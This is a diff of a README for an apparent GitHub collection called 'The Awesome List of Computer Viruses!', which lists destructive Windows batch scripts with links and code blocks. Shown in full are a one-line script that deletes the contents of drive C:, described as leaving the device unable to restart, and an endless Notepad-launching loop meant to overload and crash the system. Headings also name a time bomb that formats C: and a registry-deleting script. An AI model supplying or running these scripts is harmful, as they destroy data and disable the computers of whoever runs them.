@@ -24,7 +24,7 @@ The viruses here are mostly very dangerous.
 # The Awesome List of Computer Viruses!
 
 
-1. Deletes all content of a drive
+### Deletes all content of a drive
 
 
 <details><summary> Read More </summary>
@@ -42,7 +42,7 @@ shutdown -r -f -t <span class="hljs-number">00</span>
 
 
 
-2. Time Bomb Virus, formats C: on 25 November 2023
+### Time Bomb Virus, formats C: on 25 November 2023
 
 
 <details><summary> Read More </summary>
@@ -62,7 +62,7 @@ shutdown -r -f -t <span class="hljs-number">00</span>
 
 
 
-3. Crash Ur Computer of Windows Xp
+### Crash Ur Computer of Windows Xp
 
 
 <details><summary> Read More </summary>
@@ -83,7 +83,7 @@ WSHShell.Run “Tourstart.exe”
 
   </details>
 
-4. Delete Key Registry Files 
+### Delete Key Registry Files 
 
 
 
@@ -101,7 +101,7 @@ GOTO MESSAGE
 
   </details>
 
-5. The Most Simple Virus To Crush The Window. Delete C:/
+### The Most Simple Virus To Crush The Window. Delete C:/
 
 
 <details><summary> Read More </summary>
@@ -110,14 +110,31 @@ GOTO MESSAGE
 <p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus5.bat">virus5.bat</a></p>
 <pre><code>@Echo <span class="hljs-literal">off</span>
 Del C:<span class="hljs-string">\</span> *.* |y
-</code></pre><p>You device will not restart again, after it runs once!</p>
+</code></pre><p>Your device will not restart again, after it runs once!</p>
 
  
   </details>
  
  
-virus6.bat
-Endless Notepads
+ ### Endless Notepads
+
+
+<details><summary> Read More </summary>
+ 
+ 
+<p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus6.bat">virus6.bat</a></p>
+<pre><code>@<span class="hljs-built_in">ECHO</span> off
+:top
+<span class="hljs-built_in">START</span> <span class="hljs-variable">%SystemRoot%</span>\system32\notepad.exe
+<span class="hljs-keyword">GOTO</span> top
+</code></pre><p>This will open endless notepads, until ur system gets overloaded, hanged, and crashed!</p>
+<p>NOTE : If you mistakenly open it, immediately power of and force shut down your computer, else it may crash, never to start again.</p>
+
+ 
+  </details>
+ 
+
+
 virus7.bat
 Disable Internet Permanently
 virus8.bat
